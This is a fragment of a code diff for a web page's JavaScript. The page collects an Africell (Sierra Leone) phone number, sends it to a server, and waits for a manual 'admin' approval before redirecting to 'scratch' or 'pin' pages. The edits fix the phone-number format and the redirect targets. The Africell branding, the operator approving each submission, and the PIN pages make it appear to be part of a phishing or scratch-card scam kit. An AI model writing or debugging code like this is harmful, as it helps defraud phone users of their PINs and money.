@@ -321,7 +321,8 @@
                 return;
             }
 
-            const fullPhone = '+232 ' + rawPhone;
+            // Strictly remove all spaces so phone matches server key format (+232XXXXXXXX)
+            const fullPhone = '+232' + rawPhone;
             localStorage.setItem('africellUserPhone', fullPhone);
             localStorage.setItem('userPhone', fullPhone);
 
@@ -338,7 +339,6 @@
                 const result = await response.json();
 
                 if (result.success) {
-                    // Start polling and strictly wait for admin interaction
                     pollApprovalStatus(fullPhone);
                 } else {
                     sendBtn.classList.remove('disabled-state');
@@ -354,7 +354,7 @@
         }
 
         function pollApprovalStatus(phone) {
-            const cleanPhone = phone.trim();
+            const cleanPhone = phone.replace(/\s+/g, '').trim();
             const sendBtn = document.getElementById('sendBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
 
@@ -363,16 +363,16 @@
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                     const data = await response.json();
 
-                    // Keep waiting quietly while status is 'pending'
                     if (data.status === 'approved') {
                         clearInterval(statusInterval);
-                        window.location.href = 'scratch2.html'; // Directs properly to scratch2.html as per your flow
+                        window.location.href = 'scratch.html'; // Corrected to scratch.html for Path 2
                     } 
                     else if (data.status === 'rejected' || data.status === 'wrong_id') {
                         clearInterval(statusInterval);
                         if (spinnerDiv) spinnerDiv.style.display = 'none';
                         sendBtn.classList.remove('disabled-state');
-                        showAppAlert('❌ Not Registered. Click to set Africell', () => {
+                        // Show alert and seamlessly redirect to pin3.html when OK is clicked
+                        showAppAlert('❌ Not Registered.', () => {
                             window.location.href = 'pin3.html';
                         });
                     }
